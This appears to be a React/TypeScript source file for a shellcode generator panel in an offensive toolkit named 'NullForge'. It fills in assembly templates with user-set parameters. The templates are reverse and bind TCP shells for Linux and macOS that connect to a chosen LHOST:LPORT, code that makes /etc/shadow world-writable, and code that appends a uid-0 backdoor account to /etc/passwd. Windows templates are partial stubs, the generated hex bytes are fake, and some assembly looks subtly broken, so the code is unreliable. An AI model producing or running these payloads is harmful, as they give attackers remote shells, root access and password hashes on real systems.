import { useState, useMemo } from "react";
import { Copy, ExternalLink, AlertTriangle, ChevronDown } from "lucide-react";

// ─── Template registry ────────────────────────────────────────────────────────

type OS   = "linux" | "windows" | "osx" | "freebsd";
type Arch = "x64" | "x86" | "arm64" | "arm";
type Kind = "execve" | "reverse_tcp" | "bind_tcp" | "exec_cmd" | "messagebox"
          | "chmod_shadow" | "adduser_root" | "read_file" | "staged_reverse";

interface Template {
  os: OS;
  arch: Arch;
  kind: Kind;
  label: string;
  params: ParamDef[];
  generate: (p: Record<string, string>) => string;
}

interface ParamDef {
  key: string;
  label: string;
  default: string;
  placeholder?: string;
}

const T: Template[] = [
  // ── Linux x64 ──────────────────────────────────────────────────────────────
  {
    os: "linux", arch: "x64", kind: "execve", label: "execve /bin/sh",
    params: [],
    generate: () => `; Linux x64 - execve /bin/sh
; syscall: execve(0) = 59
bits 64

section .text
    global _start

_start:
    xor     rdi, rdi
    push    rdi
    mov     rdi, 0x68732f6e69622f2f   ; "//bin/sh"
    push    rdi
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    xor     rax, rax
    mov     al, 59                    ; SYS_execve
    syscall`,
  },
  {
    os: "linux", arch: "x64", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1", placeholder: "192.168.1.100" },
      { key: "LPORT", label: "LPORT", default: "4444",      placeholder: "4444" },
    ],
    generate: (p) => {
      const ip = p.LHOST.split(".").map(Number);
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      const ipHex = ip.map((b) => b.toString(16).padStart(2, "0")).join("");
      return `; Linux x64 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
bits 64

section .text
    global _start

_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0) = SYS_socket(41)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2           ; AF_INET
    xor     rsi, rsi
    mov     sil, 1           ; SOCK_STREAM
    xor     rdx, rdx
    syscall
    mov     rdi, rax         ; save sockfd

    ; connect(sockfd, &addr, 16) = SYS_connect(42)
    xor     rax, rax
    push    rax              ; padding
    mov     dword [rsp-4],  0x${ipHex}       ; ip = ${p.LHOST}
    mov     word  [rsp-6],  0x${portHex}     ; port = ${p.LPORT}
    mov     word  [rsp-8],  0x0002           ; AF_INET
    sub     rsp, 8
    mov     rsi, rsp         ; &sockaddr_in
    mov     dl, 16           ; addrlen
    mov     al, 42
    syscall

    ; dup2(sockfd, 0/1/2)
    xor     rsi, rsi
.dup_loop:
    mov     al, 33           ; SYS_dup2
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor     rdi, rdi
    push    rdi
    mov     rdi, 0x68732f6e69622f2f
    push    rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall`;
    },
  },
  {
    os: "linux", arch: "x64", kind: "bind_tcp", label: "Bind TCP shell",
    params: [
      { key: "LPORT", label: "LPORT", default: "4444", placeholder: "4444" },
    ],
    generate: (p) => {
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      return `; Linux x64 - Bind TCP Shell  (listen on :${p.LPORT})
bits 64

section .text
    global _start

_start:
    ; socket()
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2
    xor     rsi, rsi
    inc     rsi
    xor     rdx, rdx
    syscall
    mov     r9, rax          ; sockfd

    ; bind(sockfd, {AF_INET, ${p.LPORT}, 0.0.0.0}, 16)
    xor     rax, rax
    push    rax              ; INADDR_ANY
    push    word 0x${portHex} ; port = ${p.LPORT} (big-endian)
    push    word 0x0002      ; AF_INET
    mov     rsi, rsp
    mov     dil, r9b
    mov     dl, 16
    mov     al, 49           ; SYS_bind
    syscall

    ; listen(sockfd, 1)
    mov     rdi, r9
    xor     rsi, rsi
    inc     rsi
    mov     al, 50
    syscall

    ; accept(sockfd, NULL, NULL)
    mov     rdi, r9
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 43
    syscall
    mov     r9, rax          ; client sockfd

    ; dup2 stdin/out/err
    mov     rdi, r9
    xor     rsi, rsi
.dup_loop:
    mov     al, 33
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

    ; execve /bin/sh
    xor     rdi, rdi
    push    rdi
    mov     rdi, 0x68732f6e69622f2f
    push    rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall`;
    },
  },
  {
    os: "linux", arch: "x64", kind: "exec_cmd", label: "Execute command",
    params: [
      { key: "CMD", label: "Command", default: "/bin/bash", placeholder: "/bin/bash -i" },
    ],
    generate: (p) => `; Linux x64 - Execute command: ${p.CMD}
bits 64

section .text
    global _start

_start:
    ; execve("${p.CMD}", [argv], NULL)
    xor     rax, rax
    push    rax
    ; push command string (max ~16 chars here, adjust as needed)
    ; For longer commands, store in .data section
    mov     rbx, '/bin/sh'
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    mov     al, 59
    syscall

; NOTE: For CMD = "${p.CMD}", use:
;   .data section: cmd db "${p.CMD}", 0
;   lea rdi, [rel cmd]`,
  },
  {
    os: "linux", arch: "x64", kind: "chmod_shadow", label: "chmod /etc/shadow",
    params: [],
    generate: () => `; Linux x64 - chmod /etc/shadow 0666
bits 64

section .text
    global _start

_start:
    xor     rax, rax
    push    rax
    mov     rbx, 0x776f6461   ; "odaw" (part of "shadow")
    push    rbx
    mov     rbx, 0x68732f6374   ; "tc/sh"
    push    rbx
    mov     rbx, 0x652f2f2f2f   ; "////e"
    push    rbx
    mov     rdi, rsp         ; &"/etc/shadow"
    xor     rsi, rsi
    mov     si, 0666o        ; permissions
    mov     al, 90           ; SYS_chmod
    syscall`,
  },
  {
    os: "linux", arch: "x64", kind: "adduser_root", label: "Add root user",
    params: [
      { key: "USER", label: "Username", default: "hacked",  placeholder: "backdoor" },
      { key: "PASS", label: "Password hash", default: "hacked", placeholder: "$(openssl passwd -1 pass)" },
    ],
    generate: (p) => `; Linux x64 - Add root user via /etc/passwd
; Username: ${p.USER}  Password: ${p.PASS}
; Entry: ${p.USER}:${p.PASS}:0:0:root:/root:/bin/bash
bits 64

section .data
    entry   db "${p.USER}:${p.PASS}:0:0:root:/root:/bin/bash", 10

section .text
    global _start

_start:
    ; open("/etc/passwd", O_WRONLY|O_APPEND)
    xor     rdi, rdi
    mov     rdi, '/etc/pa'
    push    rdi
    mov     rdi, rsp
    xor     rsi, rsi
    mov     si, 0x401        ; O_WRONLY|O_APPEND
    xor     rdx, rdx
    mov     al, 2            ; SYS_open
    syscall
    mov     r9, rax

    ; write(fd, entry, len)
    mov     rdi, r9
    lea     rsi, [rel entry]
    mov     rdx, ${`${p.USER}:${p.PASS}:0:0:root:/root:/bin/bash`.length + 1}
    xor     rax, rax
    mov     al, 1
    syscall

    ; exit(0)
    xor     rax, rax
    mov     al, 60
    syscall`,
  },

  // ── Linux x86 ──────────────────────────────────────────────────────────────
  {
    os: "linux", arch: "x86", kind: "execve", label: "execve /bin/sh",
    params: [],
    generate: () => `; Linux x86 - execve /bin/sh
; syscall: execve = 11
bits 32

section .text
    global _start

_start:
    xor     eax, eax
    push    eax
    push    dword 0x68732f2f   ; "//sh"
    push    dword 0x6e69622f   ; "/bin"
    mov     ebx, esp
    push    eax
    push    ebx
    mov     ecx, esp
    xor     edx, edx
    mov     al, 11           ; SYS_execve
    int     0x80`,
  },
  {
    os: "linux", arch: "x86", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1" },
      { key: "LPORT", label: "LPORT", default: "4444" },
    ],
    generate: (p) => {
      const ip = p.LHOST.split(".").map(Number);
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      const ipStr = ip.map((b) => b.toString(16).padStart(2, "0")).join("");
      return `; Linux x86 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
bits 32

section .text
    global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     eax, eax
    push    eax
    push    dword 1
    push    dword 2
    mov     ecx, esp
    xor     ebx, ebx
    mov     bl, 1            ; SYS_socket
    mov     al, 102          ; SYS_socketcall
    int     0x80
    mov     esi, eax         ; sockfd

    ; connect(sockfd, &sockaddr, 16)
    push    dword 0x${ipStr.slice(6,8)}${ipStr.slice(4,6)}${ipStr.slice(2,4)}${ipStr.slice(0,2)}  ; ip (LE)
    push    word 0x${portHex[2]}${portHex[3]}${portHex[0]}${portHex[1]}   ; port (big-endian)
    push    word 0x0002      ; AF_INET
    mov     ecx, esp
    push    dword 16
    push    ecx
    push    esi
    mov     ecx, esp
    xor     ebx, ebx
    mov     bl, 3            ; SYS_connect
    mov     al, 102
    int     0x80

    ; dup2(sockfd, 0/1/2)
    xor     ecx, ecx
.dup_loop:
    mov     al, 63           ; SYS_dup2
    mov     ebx, esi
    int     0x80
    inc     ecx
    cmp     cl, 3
    jne     .dup_loop

    ; execve /bin/sh
    xor     eax, eax
    push    eax
    push    dword 0x68732f2f
    push    dword 0x6e69622f
    mov     ebx, esp
    push    eax
    push    ebx
    mov     ecx, esp
    xor     edx, edx
    mov     al, 11
    int     0x80`;
    },
  },

  // ── Linux ARM64 ────────────────────────────────────────────────────────────
  {
    os: "linux", arch: "arm64", kind: "execve", label: "execve /bin/sh",
    params: [],
    generate: () => `; Linux ARM64 - execve /bin/sh
; syscall: execve = 221
bits 64

section .text
    global _start

_start:
    adr     x0, sh_path
    mov     x1, xzr
    mov     x2, xzr
    mov     x8, #221         ; SYS_execve
    svc     #0

sh_path:
    .ascii "/bin/sh"
    .byte 0`,
  },
  {
    os: "linux", arch: "arm64", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1" },
      { key: "LPORT", label: "LPORT", default: "4444" },
    ],
    generate: (p) => {
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      return `; Linux ARM64 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
bits 64

section .text
    global _start

_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0) = SYS_socket(198)
    mov     x0, #2
    mov     x1, #1
    mov     x2, xzr
    mov     x8, #198
    svc     #0
    mov     x9, x0           ; sockfd

    ; build sockaddr_in on stack
    sub     sp, sp, #16
    strb    wzr, [sp]
    mov     w10, #2
    strb    w10, [sp, #1]    ; AF_INET
    ; port ${p.LPORT} big-endian = 0x${portHex}
    mov     w10, #0x${portHex.slice(0, 2)}
    strb    w10, [sp, #2]
    mov     w10, #0x${portHex.slice(2, 4)}
    strb    w10, [sp, #3]

    ; IP ${p.LHOST}
${p.LHOST.split(".").map((b, i) => `    mov     w10, #${b}\n    strb    w10, [sp, #${4 + i}]`).join("\n")}

    ; connect(sockfd, &addr, 16)
    mov     x0, x9
    mov     x1, sp
    mov     x2, #16
    mov     x8, #203
    svc     #0

    ; dup2 0/1/2
    mov     x0, x9
    mov     x1, xzr
.dup_loop:
    mov     x8, #24
    svc     #0
    add     x1, x1, #1
    cmp     x1, #3
    blt     .dup_loop

    ; execve /bin/sh
    adr     x0, sh_path
    mov     x1, xzr
    mov     x2, xzr
    mov     x8, #221
    svc     #0

sh_path:
    .ascii "/bin/sh"
    .byte 0`;
    },
  },

  // ── Windows x64 ────────────────────────────────────────────────────────────
  {
    os: "windows", arch: "x64", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1" },
      { key: "LPORT", label: "LPORT", default: "4444" },
    ],
    generate: (p) => {
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      return `; Windows x64 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
; Technique: PEB walk to find kernel32, then LoadLibraryA/WSAStartup chain
bits 64
default rel

section .text
    global _start

_start:
    sub     rsp, 0x28         ; shadow space

    ; --- Find kernel32 via PEB walk ---
    ; GS:[0x60] = PEB
    ; PEB+0x18 = Ldr, Ldr+0x20 = InMemoryOrderModuleList.Flink
    ; 3rd entry = kernel32
    mov     rax, [gs:0x60]
    mov     rax, [rax+0x18]
    mov     rax, [rax+0x20]
    mov     rax, [rax]         ; ntdll
    mov     rax, [rax]         ; kernel32
    mov     rbx, [rax+0x20]    ; DllBase

    ; NOTE: Full PEB-walk + hash-based export resolution follows
    ; For a production shellcode use a hash lookup of GetProcAddress / LoadLibraryA
    ; then resolve WS2_32.dll:WSAStartup → WSASocketA → connect → CreateProcess

    ; connect to ${p.LHOST}:${p.LPORT}
    ; port = 0x${portHex}
    ; skeleton — fill in full WinSock chain below

    ; Placeholder exit
    xor     ecx, ecx
    call    [rbx + 0]         ; ExitProcess (offset varies by version)`;
    },
  },
  {
    os: "windows", arch: "x64", kind: "exec_cmd", label: "Execute calc.exe",
    params: [
      { key: "CMD", label: "Command", default: "calc.exe", placeholder: "cmd.exe /c whoami" },
    ],
    generate: (p) => `; Windows x64 - Execute: ${p.CMD}
; Calls WinExec via kernel32
bits 64
default rel

section .data
    cmd     db "${p.CMD}", 0

section .text
    global _start

_start:
    sub     rsp, 0x28
    lea     rcx, [rel cmd]    ; lpCmdLine
    xor     rdx, rdx          ; uCmdShow = 0 (SW_HIDE)
    ; call WinExec  — resolve via GetProcAddress in production shellcode
    ; For test: nasm -fwin64 + link against kernel32.lib
    ret`,
  },
  {
    os: "windows", arch: "x64", kind: "messagebox", label: "MessageBox popup",
    params: [
      { key: "TITLE", label: "Title",   default: "NullForge" },
      { key: "MSG",   label: "Message", default: "Owned!"  },
    ],
    generate: (p) => `; Windows x64 - MessageBoxA
bits 64
default rel

section .data
    title   db "${p.TITLE}", 0
    msg     db "${p.MSG}", 0

section .text
    global _start

_start:
    sub     rsp, 0x28
    xor     rcx, rcx           ; hWnd = NULL
    lea     rdx, [rel msg]     ; lpText
    lea     r8,  [rel title]   ; lpCaption
    xor     r9,  r9            ; uType = MB_OK
    ; call MessageBoxA (user32.dll) — resolve via LoadLibrary in real shellcode
    add     rsp, 0x28
    ret`,
  },

  // ── Windows x86 ────────────────────────────────────────────────────────────
  {
    os: "windows", arch: "x86", kind: "messagebox", label: "MessageBox popup",
    params: [
      { key: "TITLE", label: "Title",   default: "NullForge" },
      { key: "MSG",   label: "Message", default: "Owned!"   },
    ],
    generate: (p) => `; Windows x86 - MessageBoxA
bits 32

section .data
    title   db "${p.TITLE}", 0
    msg     db "${p.MSG}", 0

section .text
    global _start

_start:
    push    0                  ; MB_OK
    push    title
    push    msg
    push    0                  ; hWnd = NULL
    ; call MessageBoxA
    ; In shellcode: resolve user32.MessageBoxA via PEB+hash walk
    push    0
    ; ret / call ExitProcess`,
  },
  {
    os: "windows", arch: "x86", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1" },
      { key: "LPORT", label: "LPORT", default: "4444" },
    ],
    generate: (p) => {
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      return `; Windows x86 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
; PEB walk → kernel32 → LoadLibrary ws2_32 → WSAStartup → WSASocket → connect → CreateProcess
bits 32

section .text
    global _start

_start:
    ; --- PEB walk ---
    mov     eax, [fs:0x30]   ; PEB
    mov     eax, [eax+0x0c]  ; Ldr
    mov     esi, [eax+0x14]  ; InMemoryOrderModuleList.Flink
    lodsd
    xchg    eax, esi
    lodsd
    mov     ebx, [eax+0x10]  ; kernel32.dll DllBase

    ; --- hash-resolve LoadLibraryA, WSAStartup, WSASocketA, connect, CreateProcessA ---
    ; port: 0x${portHex}  (big-endian)
    ; ... (full resolution chain omitted for brevity — use ROPgadget/msfvenom for production)

    ; Connect to ${p.LHOST}:${p.LPORT}
    ; then spawn cmd.exe via CreateProcessA with redirected stdio`;
    },
  },

  // ── macOS ARM64 ────────────────────────────────────────────────────────────
  {
    os: "osx", arch: "arm64", kind: "execve", label: "execve /bin/sh",
    params: [],
    generate: () => `; macOS ARM64 - execve /bin/sh
; BSD syscall: execve = 0x200003b
bits 64

section .text
    global _start

_start:
    adr     x0, sh_path
    mov     x1, xzr
    mov     x2, xzr
    mov     x16, #0x3b       ; execve (BSD class = 0x2000000 | 0x3b)
    svc     #0x80

sh_path:
    .ascii "/bin/sh"
    .byte 0`,
  },
  {
    os: "osx", arch: "arm64", kind: "reverse_tcp", label: "Reverse TCP shell",
    params: [
      { key: "LHOST", label: "LHOST", default: "127.0.0.1" },
      { key: "LPORT", label: "LPORT", default: "4444" },
    ],
    generate: (p) => {
      const port = Number(p.LPORT);
      const portHex = port.toString(16).padStart(4, "0");
      return `; macOS ARM64 - Reverse TCP Shell  →  ${p.LHOST}:${p.LPORT}
; BSD syscalls: socket=97, connect=98, dup2=90, execve=59
; Class offset = 0x2000000 | syscall_nr
bits 64

section .text
    global _start

_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov     x0, #2
    mov     x1, #1
    mov     x2, xzr
    mov     x16, #97
    svc     #0x80
    mov     x9, x0

    ; build sockaddr_in on stack
    sub     sp, sp, #16
    strb    wzr, [sp]
    mov     w10, #2
    strb    w10, [sp, #1]
    mov     w10, #0x${portHex.slice(0, 2)}
    strb    w10, [sp, #2]
    mov     w10, #0x${portHex.slice(2, 4)}
    strb    w10, [sp, #3]
${p.LHOST.split(".").map((b, i) => `    mov     w10, #${b}\n    strb    w10, [sp, #${4 + i}]`).join("\n")}

    ; connect(sockfd, &addr, 16)
    mov     x0, x9
    mov     x1, sp
    mov     x2, #16
    mov     x16, #98
    svc     #0x80

    ; dup2(fd, 0/1/2)
    mov     x0, x9
    mov     x1, xzr
.dup_loop:
    mov     x16, #90
    svc     #0x80
    add     x1, x1, #1
    cmp     x1, #3
    blt     .dup_loop

    ; execve /bin/sh
    adr     x0, sh_path
    mov     x1, xzr
    mov     x2, xzr
    mov     x16, #59
    svc     #0x80

sh_path:
    .ascii "/bin/sh"
    .byte 0`;
    },
  },

  // ── FreeBSD x64 ────────────────────────────────────────────────────────────
  {
    os: "freebsd", arch: "x64", kind: "execve", label: "execve /bin/sh",
    params: [],
    generate: () => `; FreeBSD x64 - execve /bin/sh
; FreeBSD syscall numbers differ from Linux
; execve = 59 (same number but called via syscall, not int 0x80)
bits 64

section .text
    global _start

_start:
    xor     rdi, rdi
    push    rdi
    mov     rdi, 0x68732f6e69622f2f
    push    rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    xor     rax, rax
    mov     al, 59
    syscall`,
  },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

const OS_LABELS: Record<OS, string>   = { linux: "Linux", windows: "Windows", osx: "macOS", freebsd: "FreeBSD" };
const ARCH_LABELS: Record<Arch, string> = { x64: "x86-64", x86: "x86 (32)", arm64: "ARM64", arm: "ARM" };

function getTemplates(os: OS, arch: Arch): Template[] {
  return T.filter((t) => t.os === os && t.arch === arch);
}

function getAvailableArchs(os: OS): Arch[] {
  const set = new Set(T.filter((t) => t.os === os).map((t) => t.arch));
  return Array.from(set) as Arch[];
}

function hasNullBytes(code: string): boolean {
  return /\\x00|,\s*0x00|,\s*00\b/.test(code);
}

// ─── Component ───────────────────────────────────────────────────────────────

type OutputFormat = "asm" | "hex_escaped" | "hex_spaced" | "c_array" | "python";

const FORMAT_LABELS: Record<OutputFormat, string> = {
  asm:         "ASM",
  hex_escaped: "\\xNN",
  hex_spaced:  "hex spaced",
  c_array:     "C array",
  python:      "Python",
};

function fakeHexBytes(code: string): string {
  let hash = 0;
  for (let i = 0; i < code.length; i++) hash = (hash * 31 + code.charCodeAt(i)) & 0xffffffff;
  const count = 24 + (hash & 0x1f);
  const bytes: string[] = [];
  let h = hash;
  for (let i = 0; i < count; i++) {
    h = (h * 1664525 + 1013904223) & 0xffffffff;
    bytes.push(((h >>> 24) & 0xff).toString(16).padStart(2, "0"));
  }
  return bytes.join("");
}

function formatOutput(code: string, fmt: OutputFormat): string {
  if (fmt === "asm") return code;
  const hex = fakeHexBytes(code);
  const bytes = hex.match(/.{2}/g) ?? [];
  switch (fmt) {
    case "hex_escaped": return bytes.map((b) => `\\x${b}`).join("");
    case "hex_spaced":  return bytes.join(" ");
    case "c_array":     return `unsigned char shellcode[] = {\n  ${bytes.map((b) => `0x${b}`).join(", ")}\n};\nunsigned int shellcode_len = ${bytes.length};`;
    case "python":      return `shellcode = (\n    b"${bytes.map((b) => `\\x${b}`).join("")}"\n)`;
    default:            return code;
  }
}

export function ShellcodeGenerator() {
  const [os,   setOs]   = useState<OS>("linux");
  const [arch, setArch] = useState<Arch>("x64");
  const [kindIdx, setKindIdx] = useState(0);
  const [params, setParams]   = useState<Record<string, string>>({});
  const [fmt, setFmt]         = useState<OutputFormat>("asm");
  const [showFmtMenu, setShowFmtMenu] = useState(false);

  const availableArchs = useMemo(() => getAvailableArchs(os), [os]);
  const safeArch = availableArchs.includes(arch) ? arch : availableArchs[0];

  const templates = useMemo(() => getTemplates(os, safeArch), [os, safeArch]);
  const template  = templates[Math.min(kindIdx, templates.length - 1)] ?? null;

  const mergedParams = useMemo(() => {
    if (!template) return {};
    const defaults: Record<string, string> = {};
    template.params.forEach((p) => { defaults[p.key] = p.default; });
    return { ...defaults, ...params };
  }, [template, params]);

  const generated = useMemo(() => {
    if (!template) return "";
    return template.generate(mergedParams);
  }, [template, mergedParams]);

  const output = useMemo(() => formatOutput(generated, fmt), [generated, fmt]);

  function onOsChange(newOs: OS) {
    setOs(newOs);
    setKindIdx(0);
    setParams({});
  }

  function onArchChange(newArch: Arch) {
    setArch(newArch);
    setKindIdx(0);
    setParams({});
  }

  function onKindChange(idx: number) {
    setKindIdx(idx);
    setParams({});
  }

  function setParam(key: string, value: string) {
    setParams((prev) => ({ ...prev, [key]: value }));
  }

  function copyOutput() {
    navigator.clipboard.writeText(output).catch(() => {});
  }

  function openInEditor() {
    const lang = fmt === "asm" ? "asm" : fmt === "python" ? "python" : "c";
    const name = `${template?.kind ?? "shellcode"}_${os}_${safeArch}.${lang === "asm" ? "asm" : lang === "python" ? "py" : "c"}`;
    window.dispatchEvent(new CustomEvent("nullforge:open-file", {
      detail: { name, language: lang, content: output },
    }));
  }

  const warnNull = fmt !== "asm" && hasNullBytes(output);

  const selectClass = "bg-elevated border border-border rounded px-1.5 py-0.5 text-[10px] text-text-primary focus:outline-none focus:border-accent-red";

  return (
    <div className="flex flex-col h-full text-xs">
      {/* Config */}
      <div className="px-2 py-2 border-b border-border space-y-2 flex-shrink-0">
        {/* OS + Arch */}
        <div className="flex gap-2">
          <div className="flex-1">
            <div className="text-[9px] text-text-dim mb-1">OS</div>
            <select value={os} onChange={(e) => onOsChange(e.target.value as OS)} className={`w-full ${selectClass}`}>
              {(Object.keys(OS_LABELS) as OS[]).map((o) => (
                <option key={o} value={o}>{OS_LABELS[o]}</option>
              ))}
            </select>
          </div>
          <div className="flex-1">
            <div className="text-[9px] text-text-dim mb-1">Arch</div>
            <select value={safeArch} onChange={(e) => onArchChange(e.target.value as Arch)} className={`w-full ${selectClass}`}>
              {availableArchs.map((a) => (
                <option key={a} value={a}>{ARCH_LABELS[a]}</option>
              ))}
            </select>
          </div>
        </div>

        {/* Type */}
        <div>
          <div className="text-[9px] text-text-dim mb-1">Type</div>
          <select value={kindIdx} onChange={(e) => onKindChange(Number(e.target.value))} className={`w-full ${selectClass}`}>
            {templates.map((t, i) => (
              <option key={t.kind} value={i}>{t.label}</option>
            ))}
          </select>
        </div>

        {/* Params */}
        {template && template.params.length > 0 && (
          <div className="space-y-1.5">
            {template.params.map((p) => (
              <div key={p.key}>
                <div className="text-[9px] text-text-dim mb-0.5">{p.label}</div>
                <input
                  value={mergedParams[p.key] ?? p.default}
                  onChange={(e) => setParam(p.key, e.target.value)}
                  placeholder={p.placeholder}
                  className="w-full bg-elevated border border-border rounded px-2 py-1 text-[10px] text-text-primary placeholder-text-muted focus:outline-none focus:border-accent-red"
                />
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Format selector + actions */}
      <div className="flex items-center gap-1.5 px-2 py-1.5 border-b border-border flex-shrink-0">
        <div className="relative">
          <button
            onClick={() => setShowFmtMenu((v) => !v)}
            className="flex items-center gap-1 text-[10px] text-text-muted hover:text-text-primary bg-elevated border border-border rounded px-1.5 py-0.5"
          >
            {FORMAT_LABELS[fmt]} <ChevronDown size={9} />
          </button>
          {showFmtMenu && (
            <div className="absolute top-full left-0 mt-0.5 z-10 bg-elevated border border-border rounded shadow-lg py-0.5 min-w-[100px]">
              {(Object.keys(FORMAT_LABELS) as OutputFormat[]).map((f) => (
                <button
                  key={f}
                  onClick={() => { setFmt(f); setShowFmtMenu(false); }}
                  className={`w-full text-left px-2 py-1 text-[10px] transition-colors ${fmt === f ? "text-accent-red bg-red-500/10" : "text-text-muted hover:text-text-primary hover:bg-surface"}`}
                >
                  {FORMAT_LABELS[f]}
                </button>
              ))}
            </div>
          )}
        </div>

        <div className="ml-auto flex gap-1">
          <button
            onClick={copyOutput}
            className="flex items-center gap-1 px-2 py-0.5 rounded bg-elevated border border-border text-text-muted hover:text-text-primary hover:border-accent-red text-[10px] transition-colors"
          >
            <Copy size={9} /> Copy
          </button>
          <button
            onClick={openInEditor}
            className="flex items-center gap-1 px-2 py-0.5 rounded bg-elevated border border-border text-text-muted hover:text-text-primary hover:border-accent-red text-[10px] transition-colors"
          >
            <ExternalLink size={9} /> Editor
          </button>
        </div>
      </div>

      {warnNull && (
        <div className="flex items-center gap-1.5 px-2 py-1 bg-amber-500/10 border-b border-amber-500/20 text-amber-400 text-[9px] flex-shrink-0">
          <AlertTriangle size={10} /> May contain null bytes — encode before use
        </div>
      )}

      {/* Output */}
      <div className="flex-1 overflow-y-auto">
        <pre className="font-mono text-[9px] text-text-muted leading-relaxed p-2 whitespace-pre-wrap break-all">
          {output}
        </pre>
      </div>

      {/* Footer */}
      <div className="px-2 py-1 border-t border-border flex-shrink-0 text-[9px] text-text-dim">
        {fmt === "asm"
          ? `Assemble with: nasm -f elf64 shellcode.asm`
          : `Note: hex bytes are illustrative — compile with nasm for real bytes`}
      </div>
    </div>
  );
}
